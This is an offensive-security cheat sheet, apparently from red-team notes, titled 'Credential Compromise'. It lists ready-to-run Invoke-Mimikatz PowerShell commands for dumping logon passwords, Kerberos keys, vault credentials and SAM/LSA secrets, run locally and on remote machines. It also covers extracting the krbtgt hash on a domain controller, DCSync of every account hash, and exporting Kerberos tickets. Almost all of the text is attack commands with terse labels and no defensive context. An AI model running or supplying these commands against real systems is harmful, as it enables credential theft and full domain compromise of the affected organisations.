# Credential Compromise
> test

## Mimikatz

Dump credentials on a local machine.
```powershell
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"'
```

Dump credentials on multiple remote machines.
```powershell
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2") 
```

logon password
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
```

AES cred
```powershell
Invoke-Mimikatz-Command '"sekurlsa::ekeys"'
```

Credential Vault
```powershell
Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
```

Execute mimikatz on DC as DA to get krbtgt hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' 
```
Use the DCSync feature for getting hash
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
Export all ticket
```powershell
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
```